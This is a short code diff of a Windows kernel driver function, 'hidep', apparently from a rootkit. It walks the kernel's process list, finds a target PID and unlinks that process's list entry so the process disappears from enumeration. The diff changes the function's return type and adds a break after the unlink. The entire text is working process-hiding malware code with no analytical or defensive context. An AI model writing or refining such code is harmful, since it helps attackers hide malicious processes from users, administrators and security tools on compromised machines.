@@ -1,6 +1,6 @@
 #include "Driver.h"
 
-NTSTATUS hidep(UINT32 pid) {
+PCHAR hidep(UINT32 pid) {
 
 	ULONG PID_OFFSET = find_eproc_pid();
 
@@ -12,6 +12,7 @@ NTSTATUS hidep(UINT32 pid) {
 
 	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
+	
 
 	// Record the starting position
 	PEPROCESS StartProcess = currentProcess;
@@ -20,6 +21,7 @@ NTSTATUS hidep(UINT32 pid) {
 	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
 	CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
 	currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
+
 
 	// Loop until we find the right process to remove
 	// Or until we circle back
@@ -38,6 +40,7 @@ NTSTATUS hidep(UINT32 pid) {
 			currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
 			currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
 
+			break;
 		}
 
 		// Move to next item
@@ -46,7 +49,7 @@ NTSTATUS hidep(UINT32 pid) {
 		currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	}
 
-	return STATUS_SUCCESS;
+	return NULL;
 }
 
 
